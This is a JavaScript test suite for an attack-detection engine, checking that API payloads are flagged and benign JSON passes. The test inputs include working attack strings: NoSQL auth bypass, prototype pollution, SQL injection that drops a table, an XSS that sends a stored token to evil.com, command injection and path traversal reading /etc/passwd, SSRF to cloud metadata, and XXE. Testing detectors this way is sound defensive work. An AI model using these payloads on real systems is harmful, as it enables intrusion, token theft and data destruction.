'use strict';
const { DetectionEngine } = require('../../src/index');

describe('Scenario: API Endpoint Attacks', () => {
  let engine;
  beforeEach(() => {
    engine = new DetectionEngine();
  });

  const runPayload = (payload) => engine.detect(payload);

  it('detects NoSQL auth bypass', () => {
    const result = runPayload('{"username":"admin","password":{"$gt":""}}');
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects Prototype pollution', () => {
    const result = runPayload('{"role":"admin","__proto__":{"isAdmin":true}}');
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects Constructor prototype pollution', () => {
    const result = runPayload('{"constructor":{"prototype":{"isAdmin":true}}}');
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects SQLi in JSON string value', () => {
    const result = runPayload('{"query":"\'; DROP TABLE users;--"}');
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects Stored XSS via API', () => {
    const result = runPayload('{"search":"<script>fetch(\'http://evil.com/\'+localStorage.token)</script>"}');
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects Command injection in API', () => {
    const result = runPayload('{"cmd":"ls; cat /etc/passwd"}');
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects Path traversal via API param', () => {
    const result = runPayload('{"file":"../../etc/passwd"}');
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects SSRF to AWS metadata', () => {
    const result = runPayload('{"url":"http://169.254.169.254/latest/meta-data/"}');
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects XXE via API', () => {
    const result = runPayload('{"data":"<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><root>&xxe;</root>"}');
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects SQLi in query param', () => {
    const result = runPayload("id=1 UNION SELECT * FROM users");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects XSS in JSONP callback', () => {
    const result = runPayload("callback=<script>alert(1)</script>");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects HTTP parameter pollution (JSON)', () => {
    const result = runPayload("?field=value&field=override");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('allows benign user update', () => {
    const result = runPayload('{"username":"john","email":"john@company.com"}');
    expect(result.label).toBe('benign');
  });

  it('allows benign order', () => {
    const result = runPayload('{"quantity":2,"productId":"abc123"}');
    expect(result.label).toBe('benign');
  });

  it('allows benign JSON', () => {
    const result = runPayload('{"name":"Alice","age":30}');
    expect(result.label).toBe('benign');
  });
});
